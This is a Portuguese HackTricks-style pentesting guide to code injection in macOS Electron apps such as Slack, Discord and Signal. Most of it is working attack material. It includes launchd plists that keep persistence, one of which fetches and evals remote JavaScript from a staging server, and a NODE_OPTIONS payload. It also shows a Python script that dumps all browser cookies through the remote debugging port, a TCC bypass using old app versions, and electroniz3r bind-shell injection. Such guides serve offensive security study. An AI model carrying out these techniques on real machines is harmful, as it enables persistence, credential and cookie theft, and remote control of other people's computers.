# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informações Básicas

Se você não sabe o que é Electron, você pode encontrar [**muitas informações aqui**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Mas por enquanto, saiba apenas que o Electron executa **node**.\
E o node tem alguns **parâmetros** e **variáveis de ambiente** que podem ser usados para **fazer com que ele execute outro código** além do arquivo indicado.

### Fuses do Electron

Essas técnicas serão discutidas a seguir, mas nos últimos tempos o Electron adicionou várias **flags de segurança para preveni-las**. Essas são as [**Fuses do Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e são as usadas para **prevenir** que aplicativos Electron no macOS **carreguem código arbitrário**:

- **`RunAsNode`**: Se desativado, impede o uso da variável de ambiente **`ELECTRON_RUN_AS_NODE`** para injetar código.
- **`EnableNodeCliInspectArguments`**: Se desativado, parâmetros como `--inspect`, `--inspect-brk` não serão respeitados. Evitando assim a injeção de código.
- **`EnableEmbeddedAsarIntegrityValidation`**: Se ativado, o **`arquivo`** **`asar`** carregado será **validado** pelo macOS. **Prevenindo** assim a **injeção de código** ao modificar o conteúdo deste arquivo.
- **`OnlyLoadAppFromAsar`**: Se isso estiver ativado, em vez de procurar carregar na seguinte ordem: **`app.asar`**, **`app`** e finalmente **`default_app.asar`**. Ele apenas verificará e usará app.asar, garantindo assim que quando **combinado** com a fuse **`embeddedAsarIntegrityValidation`** é **impossível** **carregar código não validado**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Se ativado, o processo do navegador usa o arquivo chamado `browser_v8_context_snapshot.bin` para seu snapshot V8.

Outra fuse interessante que não estará prevenindo a injeção de código é:

- **EnableCookieEncryption**: Se ativado, o armazenamento de cookies no disco é criptografado usando chaves de criptografia em nível de SO.

### Verificando as Fuses do Electron

Você pode **verificar essas flags** de um aplicativo com:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando Fuses do Electron

Como os [**docs mencionam**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), a configuração dos **Fuses do Electron** é configurada dentro do **binário do Electron**, que contém em algum lugar a string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Em aplicações macOS, isso está tipicamente em `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Você pode carregar este arquivo em [https://hexed.it/](https://hexed.it/) e procurar pela string anterior. Após essa string, você pode ver em ASCII um número "0" ou "1" indicando se cada fusível está desativado ou ativado. Basta modificar o código hex (`0x30` é `0` e `0x31` é `1`) para **modificar os valores dos fusíveis**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Note que se você tentar **sobrescrever** o **`Electron Framework`** binário dentro de um aplicativo com esses bytes modificados, o aplicativo não funcionará.

## RCE adicionando código a Aplicações Electron

Pode haver **arquivos JS/HTML externos** que um App Electron está usando, então um atacante poderia injetar código nesses arquivos cuja assinatura não será verificada e executar código arbitrário no contexto do aplicativo.

> [!CAUTION]
> No entanto, no momento, existem 2 limitações:
>
> - A permissão **`kTCCServiceSystemPolicyAppBundles`** é **necessária** para modificar um App, então por padrão isso não é mais possível.
> - O arquivo compilado **`asap`** geralmente tem os fusíveis **`embeddedAsarIntegrityValidation`** `e` **`onlyLoadAppFromAsar`** `ativados`
>
> Tornando esse caminho de ataque mais complicado (ou impossível).

Note que é possível contornar a exigência de **`kTCCServiceSystemPolicyAppBundles`** copiando o aplicativo para outro diretório (como **`/tmp`**), renomeando a pasta **`app.app/Contents`** para **`app.app/NotCon`**, **modificando** o arquivo **asar** com seu código **malicioso**, renomeando-o de volta para **`app.app/Contents`** e executando-o.

Você pode descompactar o código do arquivo asar com:
```bash
npx asar extract app.asar app-decomp
```
E empacote-o novamente após tê-lo modificado com:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE com `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), se essa variável de ambiente estiver definida, ela iniciará o processo como um processo normal do Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Se o fuse **`RunAsNode`** estiver desativado, a variável de ambiente **`ELECTRON_RUN_AS_NODE`** será ignorada, e isso não funcionará.

### Injeção do Plist do App

Como [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), você pode abusar dessa variável de ambiente em um plist para manter a persistência:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE com `NODE_OPTIONS`

Você pode armazenar a carga útil em um arquivo diferente e executá-la:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Se o fuse **`EnableNodeOptionsEnvironmentVariable`** estiver **desativado**, o aplicativo **ignorar**á a variável de ambiente **NODE_OPTIONS** ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fuse **`RunAsNode`** estiver desativado.
>
> Se você não definir **`ELECTRON_RUN_AS_NODE`**, você encontrará o **erro**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injeção do Plist do App

Você pode abusar dessa variável de ambiente em um plist para manter a persistência adicionando essas chaves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE com inspeção

De acordo com [**este**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se você executar um aplicativo Electron com flags como **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, uma **porta de depuração será aberta** para que você possa se conectar a ela (por exemplo, do Chrome em `chrome://inspect`) e você poderá **injetar código nela** ou até mesmo iniciar novos processos.\
Por exemplo:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Se o fuse **`EnableNodeCliInspectArguments`** estiver desativado, o aplicativo **ignorar parâmetros do node** (como `--inspect`) ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fuse **`RunAsNode`** estiver desativado.
>
> No entanto, você ainda pode usar o **parâmetro electron `--remote-debugging-port=9229`**, mas o payload anterior não funcionará para executar outros processos.

Usando o parâmetro **`--remote-debugging-port=9222`**, é possível roubar algumas informações do aplicativo Electron, como o **histórico** (com comandos GET) ou os **cookies** do navegador (já que eles são **decriptados** dentro do navegador e há um **endpoint json** que os fornecerá).

Você pode aprender como fazer isso [**aqui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**aqui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usar a ferramenta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou um script simples como:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Em [**este blogpost**](https://hackerone.com/reports/1274695), esse debugging é abusado para fazer um chrome headless **baixar arquivos arbitrários em locais arbitrários**.

### Injeção do Plist do App

Você poderia abusar dessa variável de ambiente em um plist para manter a persistência adicionando essas chaves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass TCC abusando de Versões Antigas

> [!TIP]
> O daemon TCC do macOS não verifica a versão executada do aplicativo. Portanto, se você **não conseguir injetar código em um aplicativo Electron** com nenhuma das técnicas anteriores, você pode baixar uma versão anterior do APP e injetar código nela, pois ainda obterá as permissões do TCC (a menos que o Trust Cache impeça).

## Executar Código não JS

As técnicas anteriores permitirão que você execute **código JS dentro do processo do aplicativo electron**. No entanto, lembre-se de que os **processos filhos são executados sob o mesmo perfil de sandbox** que o aplicativo pai e **herdam suas permissões do TCC**.\
Portanto, se você quiser abusar de permissões para acessar a câmera ou o microfone, por exemplo, você pode simplesmente **executar outro binário a partir do processo**.

## Injeção Automática

A ferramenta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) pode ser facilmente usada para **encontrar aplicativos electron vulneráveis** instalados e injetar código neles. Esta ferramenta tentará usar a técnica **`--inspect`**:

Você precisa compilá-la você mesmo e pode usá-la assim:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referências

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
